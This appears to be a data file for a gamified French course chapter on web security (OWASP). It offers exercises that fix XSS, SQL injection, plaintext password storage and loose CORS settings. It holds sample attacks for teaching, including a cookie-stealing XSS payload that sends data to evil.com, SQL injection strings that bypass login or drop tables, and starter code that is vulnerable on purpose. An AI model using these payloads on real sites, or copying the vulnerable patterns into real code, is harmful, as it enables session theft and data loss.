import type { ChapterData } from "@/data/courses/html/types";

export const chapitre1: ChapterData = {
  slug: "chapitre-1",
  tag: "MISSION : BLINDAGE ANTI-INTRUSION",
  title: "SECURITE &\nOWASP",
  subtitle: "Protege ton application contre les attaques les plus communes",
  totalXp: 280,
  completionBadge: "🛡",
  completionBadgeLabel: "OFFICIER SECURITE",
  steps: [
    {
      startCode:
        "// Cette fonction est VULNERABLE au XSS :\n// elle insere du HTML directement venant de l'utilisateur.\n// Corrige-la pour echapper le contenu avant insertion.\nfunction afficherCommentaire(commentaire) {\n  document.getElementById('zone').innerHTML = commentaire;\n}\n",
      placeholder: "// .textContent = ... (ou .innerText)",
      narrator:
        "Le XSS (Cross-Site Scripting) permet a un attaquant d'injecter du JavaScript dans ta page. Si un utilisateur poste '<script>vol_de_cookies()</script>' et que tu l'affiches via innerHTML, c'est jeu fini. Corrige cette faille.",
      hint: "function afficherCommentaire(commentaire) {\n  document.getElementById('zone').textContent = commentaire;\n}\n// textContent traite TOUJOURS la valeur comme du texte, jamais comme du HTML.",
      briefing: {
        title: "XSS : Cross-Site Scripting",
        content: `
### Le scenario typique
Un attaquant poste ce commentaire :
\`<script>fetch('https://evil.com?cookie=' + document.cookie)</script>\`

Si tu l'affiches via \`innerHTML\`, le script s'execute chez TOUS les visiteurs. Il peut voler les sessions, taper les mots de passe, faire des actions en leur nom.

### Les 3 regles d'or
1. **JAMAIS d'innerHTML avec du contenu utilisateur** -> utilise \`textContent\` ou \`innerText\`
2. **Echappe quand tu dois afficher du HTML** (libs comme DOMPurify)
3. **Configure une Content-Security-Policy** dans tes headers HTTP

### React et autres frameworks
React echappe AUTOMATIQUEMENT tout ce qui passe par \`{...}\`. Tu ne peux injecter du HTML brut qu'avec \`dangerouslySetInnerHTML\` — le nom est volontairement effrayant.

\`<div>{commentaire}</div>  // SAFE\`
\`<div dangerouslySetInnerHTML={{ __html: commentaire }} />  // DANGER\`

### Stored vs Reflected XSS
- **Stored** : l'attaque est sauvegardee en base (commentaire, profil) et touche TOUS les visiteurs
- **Reflected** : l'attaque est dans l'URL et ne touche que la victime cliquant sur le lien malicieux

**A retenir :** Tout contenu utilisateur est suspect. textContent par defaut, sanitization avant tout HTML.
        `,
      },
      objectives: [
        { id: "o1a", label: "Remplacer innerHTML par textContent" },
        { id: "o1b", label: "Comprendre pourquoi innerHTML est dangereux" },
      ],
      missionIcon: "🛡",
      missionTag: "PROTOCOLE 01",
      missionTtl: "ANTI-XSS",
      bannerIcon: "🛡",
      bannerTtl: "INJECTION BLOQUEE",
      bannerSub: "Ton application repousse les attaques XSS.",
      bannerXp: "⚡ +65 XP",
    },
    {
      startCode:
        "// Cette fonction est VULNERABLE a l'injection SQL.\n// Si l'utilisateur tape 'a' OR '1'='1, il voit TOUS les pilotes.\n// Corrige-la en utilisant des parametres prepared.\nasync function chercherPilote(nom) {\n  const sql = `SELECT * FROM pilotes WHERE nom = '${nom}'`;\n  return await db.query(sql);\n}\n",
      placeholder: "// db.query('... WHERE nom = $1', [nom])",
      narrator:
        "L'injection SQL est l'attaque n°1 selon l'OWASP depuis 20 ans. Concatener une valeur utilisateur dans une requete SQL, c'est lui donner le clavier sur ta base. Les requetes parametrees rendent l'attaque impossible.",
      hint: "async function chercherPilote(nom) {\n  const sql = 'SELECT * FROM pilotes WHERE nom = $1';\n  return await db.query(sql, [nom]);\n}\n// Le driver traite $1 comme une valeur, pas comme du SQL.",
      briefing: {
        title: "SQL Injection",
        content: `
### L'attaque classique
Code vulnerable :
\`SELECT * FROM users WHERE login = '\${input}' AND password = '\${pwd}'\`

L'attaquant entre comme login : \`admin' --\`

La requete devient :
\`SELECT * FROM users WHERE login = 'admin' --' AND password = '...'\`

Le \`--\` commente le reste. Il est connecte sans mot de passe.

Variante destructrice : \`'; DROP TABLE users; --\`

### La solution : prepared statements
Le driver separe la STRUCTURE de la requete des VALEURS :

\`db.query('SELECT * FROM users WHERE login = $1', [input]);\`

\`$1\` (Postgres) ou \`?\` (MySQL) est un placeholder. La valeur est echappee par le driver. Aucune injection possible.

### Avec un ORM (Prisma, TypeORM, Drizzle)
Tu n'ecris quasi jamais de SQL brut. L'ORM gere les parametres pour toi.

\`prisma.users.findFirst({ where: { login: input } });\`

### Autres injections
- **NoSQL injection** : MongoDB accepte des operateurs \`$\` dans les objets -> filtre les inputs
- **Command injection** : ne jamais passer un input dans \`exec()\` shell
- **LDAP, XML, ORM injection** : memes principes, contextes differents

**A retenir :** Jamais de concatenation de strings avec input utilisateur dans une requete. Prepared statements ou ORM, point.
        `,
      },
      objectives: [
        { id: "o2a", label: "Remplacer la concatenation par un placeholder" },
        { id: "o2b", label: "Passer la valeur en tableau de parametres" },
      ],
      missionIcon: "💉",
      missionTag: "PROTOCOLE 02",
      missionTtl: "ANTI-SQLi",
      bannerIcon: "💉",
      bannerTtl: "BASE PROTEGEE",
      bannerSub: "Tes requetes ne sont plus injectables.",
      bannerXp: "⚡ +70 XP",
    },
    {
      startCode:
        "// Cette fonction stocke un mot de passe en CLAIR (catastrophe).\n// Utilise bcrypt pour le hasher avant insertion.\n// bcrypt.hash(password, saltRounds).\nimport bcrypt from 'bcrypt';\n\nasync function creerUser(login, password) {\n  await db.users.insertOne({ login, password });\n}\n",
      placeholder: "// const hash = await bcrypt.hash(password, 10);",
      narrator:
        "Stocker des mots de passe en clair est une faute professionnelle qui defraye la chronique chaque annee. Un leak = des millions de comptes compromis. bcrypt te donne un hash impossible a inverser, meme avec la base entiere volee.",
      hint: "import bcrypt from 'bcrypt';\n\nasync function creerUser(login, password) {\n  const hash = await bcrypt.hash(password, 10);\n  await db.users.insertOne({ login, password: hash });\n}\n\n// Verifier lors du login :\n// const ok = await bcrypt.compare(passwordEntre, user.password);",
      briefing: {
        title: "Hash de mots de passe et authentification",
        content: `
### Pourquoi pas un hash simple (SHA-256) ?
SHA-256 est rapide. Trop rapide. Un attaquant peut tester des milliards de mots de passe par seconde via des "rainbow tables" precalculees.

bcrypt est volontairement LENT (cost factor) et inclut un SALT unique par mot de passe. Cassser un hash bcrypt prend des annees, pas des secondes.

### L'usage
\`const hash = await bcrypt.hash(motDePasse, 10);\` -> a la creation
\`const ok = await bcrypt.compare(motDePasse, hash);\` -> au login

Le \`10\` est le cost factor (2^10 iterations). Augmente avec le temps : 12-14 en 2026.

### Alternatives modernes
- **Argon2** -> winner du Password Hashing Competition, recommande aujourd'hui
- **scrypt** -> bon aussi

Tous trois sont "memory-hard" : difficile a paralleliser sur GPU.

### JWT pour les sessions
Apres authentification, on emet un **JWT** (JSON Web Token) signe :

\`import jwt from 'jsonwebtoken';\`
\`const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '7d' });\`

Le client le renvoie a chaque requete dans le header \`Authorization: Bearer <token>\`.

**Critique** : le secret JWT doit etre LONG et secret. Si compromis, tout le systeme tombe.

### Et les sessions classiques ?
Cookies + table sessions cote serveur. Plus traditionnel, mieux pour la revocation immediate. JWT mieux pour le scaling stateless.

**A retenir :** bcrypt (ou Argon2) pour les passwords. JWT pour les API stateless. Secrets dans .env, JAMAIS dans le code.
        `,
      },
      objectives: [
        { id: "o3a", label: "Hasher le mot de passe avec bcrypt.hash" },
        { id: "o3b", label: "Stocker le hash, pas le mot de passe original" },
      ],
      missionIcon: "🔐",
      missionTag: "PROTOCOLE 03",
      missionTtl: "HASH PASSWORDS",
      bannerIcon: "🔐",
      bannerTtl: "SECRETS PROTEGES",
      bannerSub: "Meme un leak ne donnera pas les mots de passe en clair.",
      bannerXp: "⚡ +70 XP",
    },
    {
      startCode:
        "// Configure CORS sur ton Express API pour autoriser UNIQUEMENT https://app.codeforge.space.\n// Pas de wildcard '*' en production.\nimport express from 'express';\nimport cors from 'cors';\nconst app = express();\n\n// ... configure cors ici ...\n\napp.listen(3000);\n",
      placeholder: "// app.use(cors({ origin: '...' }))",
      narrator:
        "CORS (Cross-Origin Resource Sharing) controle qui peut appeler ton API depuis un autre domaine. Mal configure ('*' partout), c'est une porte ouverte aux abus. Bien configure, c'est ton premier filtre.",
      hint: "import express from 'express';\nimport cors from 'cors';\nconst app = express();\n\napp.use(cors({\n  origin: 'https://app.codeforge.space',\n  credentials: true\n}));\n\napp.listen(3000);",
      briefing: {
        title: "CORS, CSRF et headers de securite",
        content: `
### CORS, en bref
Par defaut, le navigateur INTERDIT a une page \`https://a.com\` de fetch \`https://b.com\`. CORS est le mecanisme qui permet a B d'AUTORISER A.

\`app.use(cors({ origin: 'https://app.codeforge.space' }));\`
-> seul app.codeforge.space peut appeler cette API.

### NE JAMAIS faire en production
\`cors({ origin: '*' })\` ouvre l'API a TOUT le monde. OK pour une API publique de lecture seule, JAMAIS si tu as de l'auth.

### CSRF : Cross-Site Request Forgery
Un site malicieux fait faire une action a l'utilisateur connecte ailleurs (ex: virement bancaire). Protection :
- **SameSite cookies** : \`Set-Cookie: ...; SameSite=Strict\`
- **CSRF token** : un jeton secret a inclure dans chaque form

### Headers de securite indispensables
Le module **helmet** pour Express en configure 90% :
\`import helmet from 'helmet'; app.use(helmet());\`

Tu obtiens :
- **X-Content-Type-Options: nosniff** : empeche le navigateur de deviner les types MIME
- **Strict-Transport-Security** : force HTTPS
- **X-Frame-Options: DENY** : empeche le clickjacking
- **Content-Security-Policy** : limite les scripts/styles externes (anti-XSS profond)

### Rate limiting
Limite le nombre de requetes par IP pour eviter le brute-force :
\`import rateLimit from 'express-rate-limit';\`
\`app.use('/login', rateLimit({ windowMs: 60_000, max: 5 }));\`

### Le top 10 OWASP
Garde-le en tete : Injection, Broken Auth, Sensitive Data Exposure, XXE, Broken Access Control, Security Misconfiguration, XSS, Insecure Deserialization, Vulnerable Components, Insufficient Logging.

**A retenir :** CORS strict, helmet, rate limit, prepared statements, bcrypt — c'est le minimum vital de toute API en prod.
        `,
      },
      objectives: [
        { id: "o4a", label: "Configurer CORS avec un origin specifique" },
        { id: "o4b", label: "Ne PAS utiliser '*' en production" },
      ],
      missionIcon: "🌐",
      missionTag: "PROTOCOLE 04",
      missionTtl: "CORS & CSRF",
      bannerIcon: "🛡",
      bannerTtl: "SURFACE D'ATTAQUE REDUITE",
      bannerSub: "Tu as installe les fondations d'une API securisee.",
      bannerXp: "⚡ +75 XP",
    },
  ],
};
